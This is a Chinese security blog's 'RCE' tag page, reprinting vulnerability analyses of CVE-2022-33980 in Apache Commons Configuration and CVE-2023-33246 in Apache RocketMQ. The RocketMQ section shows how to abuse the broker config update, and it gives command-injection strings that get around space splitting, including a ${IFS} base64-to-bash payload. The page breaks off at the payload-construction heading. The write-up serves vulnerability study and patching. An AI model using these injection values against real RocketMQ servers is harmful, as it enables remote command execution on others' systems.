@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>Tag: RCE | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Open your eyes to see the light in life">
+<meta property="og:type" content="website">
+<meta property="og:title" content="氕氘氚">
+<meta property="og:url" content="http://example.com/tags/RCE/page/3/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="Open your eyes to see the light in life">
+<meta property="og:locale">
+<meta property="article:author" content="Szczecin">
+<meta name="twitter:card" content="summary">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        
+  <section class="page-header tag">
+    <h1>- <span>RCE</span> -</h1>
+  </section>
+
+
+
+
+
+
+<section class="post-list">
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/CVE-2022-33980-Apache-Commons/">
+                关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="关于cve-2022-33980-apache-commons-configuration-远程命令执行漏洞分析">关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/543936119">星阑科技</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>7月6日，Apache官方发布安全公告，修复了一个存在于Apache Commons Configuration 组件的远程代码执行漏洞，漏洞编号：CVE-2022-33980，漏洞威胁等级：高危。恶意攻击者通过该漏洞，可在目标服务器上实现任意代码执行。</p>
+</blockquote>
+<h2><span id="相关介绍">相关介绍</span></h2><blockquote>
+<p>Apache Commons Configuration是一个Java应用程序的配置管理工具，可以从properties或者xml文件中加载软件的配置信息，用来构建支撑软件运行的基础环境。在一些配置文件较多较复杂的情况下，使用该配置工具比较可以简化配置文件的解析和管理，提高开发效率和软件的可维护性。</p>
+</blockquote>
+<h2><span id="利用范围">利用范围</span></h2><blockquote>
+<p>2.4 &lt;&#x3D; Apache Commons Configuration &lt;&#x3D;2.7</p>
+</blockquote>
+<h2><span id="前置知识">前置知识</span></h2><blockquote>
+<p>什么是变量插值？</p>
+<p>通常我们用apach的configuration2库来管理配置文件(org.apache.commons:commons-configuration2),在commons-configuration2管理的配置文件中，配置变量的值可以引用变量。举个例子：${env:xxhzz}就指代环境变量xxhzz，在commons-configuration2中这种引用动态变量的方式就叫变量插值。</p>
+<p>变量插值解析：在commons-configuration2中，负责对字符串中的变量进行解析的是org.apache.commons.configuration2.interpol.ConfigurationInterpolator类中的interpolate(Object)方法。</p>
+</blockquote>
+<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/1.png" alt="image"></p>
+<p>从漏洞通告中，可以得知Apache Commons Configuration执行变量插值，允许动态评估和扩展属性。插值的标准格式是“${prefix:name}”，其中“prefix”用于定位执行插值的org.apache.commons.configuration2.interpol.Lookup 实例。</p>
+<p>从2.4版到2.7版，默认的Lookup实例集包括可能导致任意代码执行或与远程服务器联系的插值器。如公告中提到“script” 可使用JVM脚本执行引擎(javax.script)执行表达式，若使用了不受信任的配置值，在受影响的版本中使用插值默认值的应用程序就很可能受到远程代码执行的影响。</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>了解了漏洞原理后，为更好理解漏洞的形成，需构建一个调试的demo环境。</p>
+<p>通过maven直接引入Apache Commons Configuration2.7。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/2.png" alt="image"></p>
+<p>接着构建一个触发漏洞的主类即可</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="动态调式">动态调式</span></h2><blockquote>
+<p>在对插值变量进行解析的地方打下断点。</p>
+<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#interpolate</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/4.png" alt="image"></p>
+<p>开启debug模式，在经过了前两个if判断之后，随后会进入resolveSingleVariable函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/5.png" alt="image"></p>
+<p>在org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolveSingleVariable中首先跟一下extractVariableName函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/6.png" alt="image"></p>
+<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#extractVariableName的作用是提取变量字符串strValue。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/7.png" alt="image"></p>
+<p>随后进入org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolve函数中，通过index0f查找和判断条件，从变量字符串中分别获取到prefix和name。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/8.png" alt="image"></p>
+<p>继续跟进会进入lookup函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/9.png" alt="image"></p>
+<p>在分析lookup函数前先跟进下fetchLookupForPrefix函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/10.png" alt="image"></p>
+<p>fetchLookupForPrefix函数的作用是获取到stringLookup对象。</p>
+<p>继续跟进，会进入commons-text-1.8.jar包中的org.apache.commons.text.lookup.ScriptStringLookup#lookup函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/11.png" alt="image"></p>
+<p>在org.apache.commons.text.lookup.ScriptStringLookup#lookup函数中会再次对字符串进行分割，分别提取engineName和script。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/12.png" alt="image"></p>
+<p>接着会通过getEngineByName函数获取ScriptEngine（javax.script)。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/13.png" alt="image"></p>
+<p>继续往下，出现eval函数。而我们知道eval函数可计算某个字符串，并执行其中的的JavaScript 代码。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/14.png" alt="image"></p>
+<p>继续往下将成功触发我们传入的payload，造成远程命令执行。</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/15.png" alt="image"></p>
+<p>​成功命令执行。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/16.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复建议">修复建议</span></h2><blockquote>
+<p>目前官方已发布修复版本修复了该漏洞，请受影响的用户升级到 Apache Commons Configuration 2.8.0 版本。<br><a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-configuration/download_configuration.cgi">https://commons.apache.org/proper/commons-configuration/download_configuration.cgi</a></p>
+</blockquote>
+<h2><span id="参考材料">参考材料</span></h2><blockquote>
+<p>1.<a target="_blank" rel="noopener" href="https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s">https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s</a><br>2.<a target="_blank" rel="noopener" href="https://cloud.tencent.com/devel">https://cloud.tencent.com/devel</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/">
+                Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）漏洞分析
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-rocketmq-远程代码执行漏洞cve-2023-33246漏洞分析">Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://paper.seebug.org/2081/">Sunflower@知道创宇404实验室</a> 并作补充</p>
+</blockquote>
+<h2><span id="1漏洞介绍">1.漏洞介绍</span></h2><blockquote>
+<p>Apache RocketMQ 存在远程命令执行漏洞(CVE-2023-33246)。RocketMQ的NameServer、Broker、Controller等多个组件暴露在外网且缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行命令。</p>
+</blockquote>
+<h2><span id="2漏洞版本">2.漏洞版本</span></h2><blockquote>
+<p>5.0.0 &lt;&#x3D; Apache RocketMQ &lt; 5.1.1</p>
+<p>4.0.0 &lt;&#x3D; Apache RocketMQ &lt; 4.9.6</p>
+</blockquote>
+<h2><span id="3环境搭建">3.环境搭建</span></h2><blockquote>
+<p>使用docker拉取漏洞环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull apache/rocketmq:4.9.5</span><br></pre></td></tr></table></figure>
+
+<p>运行docker run命令，搭建docker环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:4.9.5 sh mqnamesrv</span><br><span class="line">docker run -d --name rmqbroker --<span class="built_in">link</span> rmqnamesrv:namesrv -e <span class="string">&quot;NAMESRV_ADDR=namesrv:9876&quot;</span> -p 10909:10909 -p 10911:10911 -p 10912:10912 apache/rocketmq:4.9.5 sh mqbroker -c /home/rocketmq/rocketmq-4.9.5/conf/broker.conf</span><br></pre></td></tr></table></figure>
+
+<p>docker ps检查docker正常启动即可</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="4rocketmq简介">4.RocketMQ简介</span></h2><blockquote>
+<p>我们平时使用一些体育新闻软件，会订阅自己喜欢的一些球队板块，当有作者发表文章到相关的板块，我们就能收到相关的新闻推送。</p>
+<p>发布-订阅（Pub&#x2F;Sub）是一种消息范式，消息的发送者（称为发布者、生产者、Producer）会将消息直接发送给特定的接收者（称为订阅者、消费者、Comsumer）。而RocketMQ的基础消息模型就是一个简单的Pub&#x2F;Sub模型[1]。</p>
+</blockquote>
+<h3><span id="41-rocketmq的部署模型">4.1 RocketMQ的部署模型</span></h3><blockquote>
+<p>Producer、Consumer又是如何找到Topic和Broker的地址呢？消息的具体发送和接收又是怎么进行的呢？</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="42-名字服务器-nameserver">4.2 名字服务器 NameServer</span></h3><blockquote>
+<p>NameServer是一个简单的 Topic 路由注册中心，支持 Topic、Broker 的动态注册与发现。</p>
+<p>主要包括两个功能：<br>Broker管理，NameServer接受Broker集群的注册信息并且保存下来作为路由信息的基本数据。然后提供心跳检测机制，检查Broker是否还存活；<br>路由信息管理，每个NameServer将保存关于 Broker 集群的整个路由信息和用于客户端查询的队列信息。Producer和Consumer通过NameServer就可以知道整个Broker集群的路由信息，从而进行消息的投递和消费。</p>
+</blockquote>
+<h3><span id="43-代理服务器-broker">4.3 代理服务器 Broker</span></h3><blockquote>
+<p>Broker主要负责消息的存储、投递和查询以及服务高可用保证。</p>
+<p>NameServer几乎无状态节点，因此可集群部署，节点之间无任何信息同步。Broker部署相对复杂。</p>
+<p>在 Master-Slave 架构中，Broker 分为 Master 与 Slave。一个Master可以对应多个Slave，但是一个Slave只能对应一个Master。Master 与 Slave 的对应关系通过指定相同的BrokerName，不同的BrokerId 来定义，BrokerId为0表示Master，非0表示Slave。Master也可以部署多个。</p>
+</blockquote>
+<h3><span id="44-消息收发">4.4 消息收发</span></h3><blockquote>
+<p>在进行消息收发之前，我们需要告诉客户端NameServer的地址，RocketMQ有多种方式在客户端中设置NameServer地址，举例三个，优先级由高到低，高优先级会覆盖低优先级。</p>
+<p>代码中指定Name Server地址，多个namesrv地址之间用分号分割</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">producer.setNamesrvAddr(<span class="string">&quot;192.168.0.1:9876;192.168.0.2:9876&quot;</span>);  </span><br><span class="line">consumer.setNamesrvAddr(<span class="string">&quot;192.168.0.1:9876;192.168.0.2:9876&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Java启动参数中指定Name Server地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Drocketmq.namesrv.addr=192.168.0.1:9876;192.168.0.2:9876  </span><br></pre></td></tr></table></figure>
+
+<p>环境变量指定Name Server地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> NAMESRV_ADDR=192.168.0.1:9876;192.168.0.2:9876</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="45-漏洞主要涉及的类的介绍">4.5 漏洞主要涉及的类的介绍</span></h3><h4><span id="451-defaultmqadminext">4.5.1 DefaultMQAdminExt</span></h4><blockquote>
+<p>DefaultMQAdminExt是 RocketMQ 提供的一个扩展类。它提供了一些管理和操作 RocketMQ 的工具方法，可以用于管理主题（Topic）、消费者组（Consumer Group）、订阅关系等。</p>
+<p>DefaultMQAdminExt类提供了一些常用的方法，包括创建和删除主题、查询主题信息、查询消费者组信息、更新订阅关系等。它可以通过与 NameServer 交互来获取和修改相关配置信息，并提供了对 RocketMQ 的管理功能。</p>
+<p>例如DefaultMQAdminExt更新broker配置的一个方法（更新的配置文件为broker.conf）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateBrokerConfig</span><span class="params">(String brokerAddr,</span></span><br><span class="line"><span class="params">    Properties properties)</span> <span class="keyword">throws</span> RemotingConnectException, RemotingSendRequestException,</span><br><span class="line">    RemotingTimeoutException, UnsupportedEncodingException, InterruptedException, MQBrokerException &#123;</span><br><span class="line">    defaultMQAdminExtImpl.updateBrokerConfig(brokerAddr, properties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="452-filterservermanager">4.5.2 FilterServerManager</span></h4><blockquote>
+<p>在 Apache RocketMQ 中，FilterServerManager 类是用于管理过滤服务器（Filter Server）的类。过滤服务器是 RocketMQ 中的一种组件，用于支持消息过滤功能。过滤服务器负责处理消息过滤规则的注册、更新和删除，以及消息过滤的评估和匹配。</p>
+</blockquote>
+<h2><span id="5漏洞分析">5.漏洞分析</span></h2><blockquote>
+<p>补丁文件[2]中直接将Filter Server模块全部移除，所以我们可以直接来看FilterServerManager，简要分析一下FilterServerManager的调用流程：</p>
+<p>在Broker启动时执行sh mqbroker…，调用到BrokerStartup类：</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/3.png" alt="image"></p>
+<p>在该类中继续调用到BrokerController中的start()方法</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/4.png" alt="image"></p>
+<p>继续跟进</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/5.png" alt="image"></p>
+<p>最终到了FilterServerManager类中，其中FilterServerUtil.callShell();存在命令执行:</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.scheduledExecutorService.scheduleAtFixedRate(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                FilterServerManager.<span class="built_in">this</span>.createFilterServer();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span> * <span class="number">5</span>, <span class="number">1000</span> * <span class="number">30</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createFilterServer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">more</span> <span class="operator">=</span></span><br><span class="line">        <span class="built_in">this</span>.brokerController.getBrokerConfig().getFilterServerNums() - <span class="built_in">this</span>.filterServerTable.size();</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="built_in">this</span>.buildStartCommand();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; more; i++) &#123;</span><br><span class="line">        FilterServerUtil.callShell(cmd, log);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">buildStartCommand</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">config</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (BrokerStartup.configFile != <span class="literal">null</span>) &#123;</span><br><span class="line">        config = String.format(<span class="string">&quot;-c %s&quot;</span>, BrokerStartup.configFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.brokerController.getBrokerConfig().getNamesrvAddr() != <span class="literal">null</span>) &#123;</span><br><span class="line">        config += String.format(<span class="string">&quot; -n %s&quot;</span>, <span class="built_in">this</span>.brokerController.getBrokerConfig().getNamesrvAddr());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (RemotingUtil.isWindowsPlatform()) &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;start /b %s\\bin\\mqfiltersrv.exe %s&quot;</span>,</span><br><span class="line">            <span class="built_in">this</span>.brokerController.getBrokerConfig().getRocketmqHome(),</span><br><span class="line">            config);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;sh %s/bin/startfsrv.sh %s&quot;</span>,</span><br><span class="line">            <span class="built_in">this</span>.brokerController.getBrokerConfig().getRocketmqHome(),</span><br><span class="line">            config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>根据start()方法内部可知createFilterServer方法每隔30秒都会被调用一次，</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.scheduledExecutorService.scheduleAtFixedRate(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                FilterServerManager.<span class="built_in">this</span>.createFilterServer();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span> * <span class="number">5</span>, <span class="number">1000</span> * <span class="number">30</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>到了这一步，很明显我们只需要控制BrokerConfig进行命令拼接，等待触发createFilterServer即可造成RCE。</p>
+<p>但是要想成功触发命令执行还有两个问题需要解决一下：</p>
+<p>1、在createFilterServer方法中，more的值要大于0才会触发callShell方法</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createFilterServer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">more</span> <span class="operator">=</span></span><br><span class="line">        <span class="built_in">this</span>.brokerController.getBrokerConfig().getFilterServerNums() - <span class="built_in">this</span>.filterServerTable.size();</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="built_in">this</span>.buildStartCommand();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; more; i++) &#123;</span><br><span class="line">        FilterServerUtil.callShell(cmd, log);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里只需要通过DefaultMQAdminExt设置filterServerNums的值即可，大致为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">properties.setProperty(<span class="string">&quot;filterServerNums&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="type">DefaultMQAdminExt</span> <span class="variable">defaultMQAdminExt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQAdminExt</span>();</span><br><span class="line">...</span><br><span class="line">defaultMQAdminExt.updateBrokerConfig(<span class="string">&quot;192.168.87.128:10911&quot;</span>, props);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>2、callshell方法传入命令时，shellString会被splitShellString方法使用空格进行拆分为一个cmdArray数组。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">callShell</span><span class="params">(<span class="keyword">final</span> String shellString, <span class="keyword">final</span> InternalLogger log)</span> &#123;</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] cmdArray = splitShellString(shellString);</span><br><span class="line">        process = Runtime.getRuntime().exec(cmdArray);</span><br><span class="line">        process.waitFor();</span><br><span class="line">        log.info(<span class="string">&quot;CallShell: &lt;&#123;&#125;&gt; OK&quot;</span>, shellString);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;CallShell: readLine IOException, &#123;&#125;&quot;</span>, shellString, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != process)</span><br><span class="line">            process.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>意味着传入的命令如果带了空格，都会被拆分为数组，而数组在exec中会将每个命令的结尾标记为下一个命令的开头[3]。</p>
+<p><code>sh &#123;可控&#125;/bin/startfsrv.sh ...</code> 如果传入 <code>-c curl 127.0.0.1;</code></p>
+<p>那么comArray为 <code>[&#39;sh&#39; &#39;-c&#39; &#39;curl&#39; &#39;127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;]</code></p>
+<p>这里的每个命令的结尾作为下一个命令的开头，它将每个被传入的命令都看作为一个整体，想不出一个更合适的例子，这里可以使用shell里的单引号括起来进行辅助理解：</p>
+<p><code>&#39;sh&#39; &#39;-c&#39; &#39;curl&#39; &#39;127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;</code></p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/6.png" alt="image"></p>
+<p>很明显，这里的curl因为使用了空格，导致curl 127.0.0.1被拆分为了两个部分，正确的写法应该是：</p>
+<p><code>&#39;sh&#39; &#39;-c&#39; &#39;curl 127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;</code></p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/7.png" alt="image"></p>
+<p>但是使用空格又会被split，所以现在的问题点就在于如何避免使用空格进行完整的传参，网上公开的解法[4]：</p>
+<p><code>-c $@|sh . echo curl 127.0.0.1;</code></p>
+<p><code>$@</code> 作为一个特殊变量，它表示传递给脚本或命令的所有参数，直接将echo后面的值作为一个整体传递给$@，解决了拆分命令的问题。</p>
+<p>感谢longofo@知道创宇404实验室带我探讨出第二个绕过方法：</p>
+<p>顺便一提，这个绕过的核心点在于这里如果不使用bash，则无法成功使用${IFS}以及{}进行绕过空格限制，这里就不再进行细节讲解，感兴趣的师傅可以动手试试：</p>
+<p><code>-c bash$&#123;IFS&#125;-c$&#123;IFS&#125;\&quot;&#123;echo,dG91Y2ggL3RtcC9kZGRkZGRkYWE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;;</code></p>
+</blockquote>
+<h3><span id="51-payload构造">5.1 payload构造</span></h3><blockquote>
+<p>根据上面的知识，最终构造的payload为：</p>
+</blockquote>
